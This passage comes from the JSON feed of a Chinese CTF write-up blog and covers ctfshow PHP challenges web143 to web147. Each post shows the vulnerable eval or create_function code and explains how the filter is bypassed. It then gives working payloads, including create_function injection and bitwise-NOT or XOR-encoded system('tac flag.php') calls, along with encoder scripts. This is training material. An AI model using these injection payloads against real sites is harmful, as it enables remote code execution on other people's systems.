class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9_]*$/isD'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h3 id=\"正则部分\"><a class=\"anchor\" href=\"#正则部分\">#</a> 正则部分</h3>\n<pre><code>/i：大小写不敏感匹配\n/s：点号元字符匹配所有字符，包含换行符。\n/D：元字符美元符号仅仅匹配目标字符串的末尾\n</code></pre>\n<p>正则匹配绕过，只要 ctfshow 里有一个不是数字、小写字母和下划线就能绕过。</p>\n<h3 id=\"命名空间\"><a class=\"anchor\" href=\"#命名空间\">#</a> 命名空间</h3>\n<pre><code>php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法\n</code></pre>\n<h3 id=\"create_function\"><a class=\"anchor\" href=\"#create_function\">#</a> create_function</h3>\n<p>引用这个函数时，做出了以下操作</p>\n<ol>\n<li>获取参数，函数体；</li>\n<li>拼凑一个”function __lambda_func (参数) { 函数体；} “的字符串；</li>\n<li>eval;</li>\n<li>通过__lambda_func 在函数表中找到 eval 后得到的函数体，找不到就出错；</li>\n<li>定义一个函数名:”\\000_lambda_” . count (anonymous_functions)++;</li>\n<li>用新的函数名替换__lambda_func;</li>\n<li>返回新的函数。</li>\n</ol>\n<p>php 中使用 create_function 创建匿名函数 (已弃用)，以下是借来的一个例子</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$q</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'echo'</span><span class=\"token operator\">.</span><span class=\"token variable\">$id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'is'</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$sy</span> <span class=\"token operator\">=</span> <span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$a'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$q</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>相当于这样创建</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">niming</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>       <span class=\"token keyword\">echo</span> <span class=\"token variable\">$id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'is'</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因此只要输入} 就能闭合这个函数，再用 /* 注释掉后面的}，由于这个函数执行了 eval，我们的输入就能被执行了</p>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<p>POST：</p>\n<pre><code>ctf=\\create_function\n</code></pre>\n<p>GET：</p>\n<pre><code>show=&#125;system('ls');/*\n</code></pre>\n",
            "tags": [
                "ctfshow",
                "web147",
                "ctfshow"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web145/",
            "url": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web145/",
            "title": "eval中的return-web145",
            "date_published": "2024-05-27T08:01:54.000Z",
            "content_html": "<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-10-13 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-10-18 17:41:33</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\>|\\*|\\/|\\^|\\#|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get out hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>+、-、* 都被过滤了，^ 也被过滤了，那就使用 |，payload 使用取反</p>\n<h3 id=\"取反脚本\"><a class=\"anchor\" href=\"#取反脚本\">#</a> 取反脚本</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'tac flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>payload</p>\n<pre><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|\n</code></pre>\n<p>或</p>\n<pre><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F):\n</code></pre>\n",
            "tags": [
                "ctfshow",
                "web145",
                "ctfshow"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web144/",
            "url": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web144/",
            "title": "eval中的return-web144",
            "date_published": "2024-05-27T07:21:46.000Z",
            "content_html": "<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-10-13 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-10-18 16:21:15</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^\\W+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token operator\">?</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">:</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>v1 必须是数字，v3 只能是一个字符，v2 是除了数字、字母、下划线以外的字符，那就只能在 v2 中执行</p>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<pre><code>/?v1=1&amp;v3=1&amp;v2=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)\n</code></pre>\n",
            "tags": [
                "ctfshow",
                "web144",
                "ctfshow"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web143/",
            "url": "http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web143/",
            "title": "eval中的return-web143",
            "date_published": "2024-05-27T06:54:39.000Z",
            "content_html": "<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-10-13 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-10-18 12:48:14</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'get out hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>v1 和 v2 都得是数字，只能在 v3 上写 payload，但是有 return 干扰，可以添加 + - * 等字符。</p>\n<h3 id=\"异或脚本\"><a class=\"anchor\" href=\"#异或脚本\">#</a> 异或脚本</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"tac flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"%\"</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token 